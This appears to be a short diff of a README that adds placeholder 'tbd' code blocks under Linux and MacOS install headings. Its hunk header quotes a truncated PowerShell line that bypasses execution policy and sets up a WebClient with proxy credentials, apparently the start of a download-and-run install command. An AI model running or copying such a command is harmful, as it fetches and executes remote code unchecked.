@@ -30,7 +30,15 @@ powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.Cr
 
 ### Linux
 
+```bash
+tbd
+```
+
 ### MacOS
+
+```bash
+tbd
+```
 
 ## Usage
 
